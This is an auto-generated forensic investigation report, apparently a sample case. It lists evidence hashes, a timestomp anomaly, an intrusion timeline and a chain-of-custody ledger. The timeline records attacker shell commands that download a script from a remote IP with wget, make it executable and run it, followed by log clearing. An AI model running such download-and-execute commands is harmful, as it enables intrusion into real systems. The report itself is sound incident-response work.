# WASP Investigation Report — CASE-2026-LIVE

**Lead Examiner:** Alex Mercer (Senior Forensics Examiner)  
**Organization:** Cyber Incident Response Unit  
**Authorization Reference:** WARRANT-2026-0881  
**Schema Version:** 2.0.0 | **Tool Version:** 1.4.0  

---

## 1. Executive Summary & PS Objectives Matrix

| # | Objective | Status | Findings |
|---|---|---|---|
| 1 | **File metadata extraction** | COMPLETED | Extracted filesystem stats, OOXML properties, PDF metadata, ZIP entries. |
| 2 | **System artefact extraction** | COMPLETED | Extracted MFT, registry hives, EVTX event logs, Prefetch, LNK shortcuts, browser history. |
| 3 | **Timestamp extraction** | COMPLETED | Decoded multi-epoch timestamps normalized to UTC with explainable confidence. |
| 4 | **Chronological timeline reconstruction** | COMPLETED | Generated single normalized super-timeline with 28 records. |
| 5 | **SHA-256 evidence integrity** | VERIFIED | Mandatory SHA-256 computed; custody ledger replayed; Merkle root: `111699e3aa45304cf56ce5aeba74e1edf729110504669c4784f4071acd777f24`. |
| 6 | **Structured investigation reports** | COMPLETED | Compiled multi-format reports with provenance, integrity block, and privacy redaction. |

---

## 2. Digital Evidence Inventory (SHA-256 Hashes)

| Evidence ID | Path | Container | Size (Bytes) | SHA-256 Hash | Status |
|---|---|---|---|---|---|

| `EV-AUTH.L` | `evidence/auth.log` | raw | 283 | `b544dfd8cc0d4521f4ba801cd4b9215ef76b6a5f76149038b6171cd664e095e4` | MATCH |

| `EV-BASH_H` | `evidence/bash_history` | raw | 112 | `a45c0410ad9fea5a6fec7056a904d518673c2e1950f124d9383dbdcfbfbdf554` | MATCH |

| `EV-EXFILT` | `evidence/exfiltrated_files.zip` | raw | 317 | `8a252f40cc112bc85026e02e55319ac04ce8e2c423b651d7f30c84e7d93d806b` | MATCH |

| `EV-HISTOR` | `evidence/History` | raw | 8192 | `ddeee48ddcd3e8fd4b88dbe62d5624d7e71983919f0a12ceb3f79844e2322b95` | MATCH |

| `EV-INVEST` | `evidence/investigation_memo.docx` | raw | 813 | `fda42f5fbe11e473969a097232b164aea986327815b27694178a650e9a8b1e6b` | MATCH |

| `EV-SECURI` | `evidence/Security_Events.jsonl` | raw | 503 | `15957efb2f1573f54296ac349387196a60825acb65518ab856a5179afe1e8ad0` | MATCH |


---




## 4. Cross-Source Corroboration & Anti-Forensics Analysis

- **Corroborated Activity Clusters:** 0
- **Corroborated Events Count:** 0
- **Anti-Forensics / Conflicts Detected:** 1


### Anti-Forensic Anomalies & Timestomp Conflicts
| Severity | Entity | Anomaly Type | Description |
|---|---|---|---|

| **MEDIUM** | `investigation_memo.docx` | `MODIFIED_PRE_CREATION` | Timestomp suspect: Modified time 2024-03-11T01:50:00+00:00 precedes creation time 2026-10-08T10:02:03.493529+00:00 |





---


## 5. Reconstructed Chronological Activity Timeline (Excerpt)

| UTC Timestamp | Action | User | Object / Target | Source Artefact | Corroborated By | Conf. | Rationale |
|---|---|---|---|---|---|---|---|

| `2024-03-10T14:30:00+00:00` | `FILE_CREATE` | [USER_001] | `evidence/investigation_memo.docx` | ooxml:core_properties | `-` | 0.98 | OOXML dcterms:created metadata |

| `2024-03-10T20:50:00+00:00` | `WEB_VISIT` | UNKNOWN | `https://github.com/malicious/repo` | Browser:Chromium:evidence/History | `-` | 0.97 | Chromium last_visit_time WebKit timestamp |

| `2024-03-10T21:00:00+00:00` | `WEB_VISIT` | UNKNOWN | `https://pastebin.com/raw/d849fa` | Browser:Chromium:evidence/History | `-` | 0.97 | Chromium last_visit_time WebKit timestamp |

| `2024-03-11T01:50:00+00:00` | `FILE_WRITE` | [USER_002] | `evidence/investigation_memo.docx` | ooxml:core_properties | `-` | 0.98 | OOXML dcterms:modified metadata (⚠️ Timestomp suspect: Modified time 2024-03-11T01:50:00+00:00 precedes creation time 2026-10-08T10:02:03.493529+00:00) |

| `2024-03-11T02:14:07+00:00` | `AUTH_LOGIN` | [USER_003] | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 4624 |

| `2024-03-11T02:14:07+00:00` | `AUTH_LOGIN` | UNKNOWN | `sshd[4401]` | Linux:sshd[4401]:evidence/auth.log | `-` | 0.85 | Syslog entry for sshd[4401] (assumed year 2024) |

| `2024-03-11T02:15:00+00:00` | `PROCESS_START` | UNKNOWN | `wget http://[IP_004]/payload.sh` | Linux:bash_history:evidence/bash_history | `-` | 0.95 | Bash history command execution with Unix timestamp |

| `2024-03-11T02:15:30+00:00` | `FILE_ACCESS` | UNKNOWN | `sudo` | Linux:sudo:evidence/auth.log | `-` | 0.85 | Syslog entry for sudo (assumed year 2024) |

| `2024-03-11T02:16:00+00:00` | `PROCESS_START` | UNKNOWN | `chmod +x payload.sh` | Linux:bash_history:evidence/bash_history | `-` | 0.95 | Bash history command execution with Unix timestamp |

| `2024-03-11T02:16:15+00:00` | `PROCESS_START` | [USER_003] | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 4688 |

| `2024-03-11T02:17:00+00:00` | `PROCESS_START` | UNKNOWN | `./payload.sh` | Linux:bash_history:evidence/bash_history | `-` | 0.95 | Bash history command execution with Unix timestamp |

| `2024-03-11T02:17:30+00:00` | `SERVICE_INSTALL` | UNKNOWN | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 7045 |

| `2024-03-11T02:18:45+00:00` | `FILE_ACCESS` | UNKNOWN | `sshd[4401]` | Linux:sshd[4401]:evidence/auth.log | `-` | 0.85 | Syslog entry for sshd[4401] (assumed year 2024) |

| `2024-03-11T02:20:00+00:00` | `LOG_CLEARED` | [USER_003] | `N/A` | EVTX:evidence/Security_Events.jsonl | `-` | 0.99 | Windows Event Log JSON entry for Event ID 1102 |

| `2026-10-08T10:01:58.539355+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/auth.log` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-08T10:01:58.545404+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/bash_history` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-08T10:01:58.550889+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/Security_Events.jsonl` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-08T10:01:58.619588+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/History` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-08T10:01:58.636041+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/investigation_memo.docx` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-08T10:01:58.650600+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/exfiltrated_files.zip` | filesystem:stat | `-` | 0.95 | Filesystem stat modification time (mtime) |

| `2026-10-08T10:01:58.783298+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/auth.log` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-08T10:02:00.353020+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/bash_history` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-08T10:02:01.368922+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/exfiltrated_files.zip` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-08T10:02:02.418484+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/History` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-08T10:02:03.493529+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/investigation_memo.docx` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-08T10:02:04.433918+00:00` | `FILE_CREATE` | UNKNOWN | `evidence/Security_Events.jsonl` | filesystem:stat | `-` | 0.9 | Filesystem stat creation/change time (ctime/birthtime) |

| `2026-10-08T15:31:58+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/exfiltrated_files.zip::financial_report.pdf` | zip:entry_central_dir | `-` | 0.85 | ZIP entry central directory DOS timestamp |

| `2026-10-08T15:31:58+00:00` | `FILE_WRITE` | UNKNOWN | `evidence/exfiltrated_files.zip::passwords.txt` | zip:entry_central_dir | `-` | 0.85 | ZIP entry central directory DOS timestamp |


*(Total reconstructed timeline events: 28)*

---

## 6. Cryptographic Integrity & Attestation

- **Overall Integrity Check:** `PASS`
- **Custody Ledger Replay:** `PASS` (15 entries verified)
- **Derived Files Status:** `PASS`
- **Merkle Root Digest:** `111699e3aa45304cf56ce5aeba74e1edf729110504669c4784f4071acd777f24`

---

## 7. Chain of Custody Audit Log

| Seq | Timestamp (UTC) | Actor | Event Type | Prev Hash | Entry Hash |
|---|---|---|---|---|---|

| 1 | `2026-10-08T10:01:58.665170+00:00` | Alex Mercer (Senior Forensics Examiner) | `case_created` | `000000000000...` | `164bb4c47f0d...` |

| 2 | `2026-10-08T10:02:00.308220+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `164bb4c47f0d...` | `fe086b171300...` |

| 3 | `2026-10-08T10:02:01.353673+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `fe086b171300...` | `4e549d046736...` |

| 4 | `2026-10-08T10:02:02.403293+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `4e549d046736...` | `9ce0b81e0d87...` |

| 5 | `2026-10-08T10:02:03.477706+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `9ce0b81e0d87...` | `f2971c9f6470...` |

| 6 | `2026-10-08T10:02:04.404269+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `f2971c9f6470...` | `df74ba7b06e0...` |

| 7 | `2026-10-08T10:02:05.431342+00:00` | Alex Mercer (Senior Forensics Examiner) | `evidence_acquired` | `df74ba7b06e0...` | `0a7c45d56bb4...` |

| 8 | `2026-10-08T10:02:05.689418+00:00` | Alex Mercer (Senior Forensics Examiner) | `artefacts_extracted` | `0a7c45d56bb4...` | `5d2ecc93fece...` |

| 9 | `2026-10-08T10:02:06.613917+00:00` | Alex Mercer (Senior Forensics Examiner) | `cross_source_corroborated` | `5d2ecc93fece...` | `7dc74f4654ce...` |

| 10 | `2026-10-08T10:02:06.674292+00:00` | Alex Mercer (Senior Forensics Examiner) | `threat_rules_scanned` | `7dc74f4654ce...` | `627c3c84942e...` |

| 11 | `2026-10-08T10:02:09.382480+00:00` | Alex Mercer (Senior Forensics Examiner) | `timeline_built` | `627c3c84942e...` | `7b1f3cab6d83...` |

| 12 | `2026-10-08T10:02:09.468008+00:00` | Alex Mercer (Senior Forensics Examiner) | `process_lineage_reconstructed` | `7b1f3cab6d83...` | `c15e9506da76...` |

| 13 | `2026-10-08T10:02:09.547577+00:00` | Alex Mercer (Senior Forensics Examiner) | `anomalies_detected` | `c15e9506da76...` | `853b3b523348...` |

| 14 | `2026-10-08T10:02:09.626387+00:00` | Alex Mercer (Senior Forensics Examiner) | `sigma_rules_evaluated` | `853b3b523348...` | `aeff1a97fbe7...` |

| 15 | `2026-10-08T10:02:09.923146+00:00` | Alex Mercer (Senior Forensics Examiner) | `integrity_verified` | `aeff1a97fbe7...` | `7aad9a8e2c01...` |


---
*Generated automatically by WASP v1.4.0.*
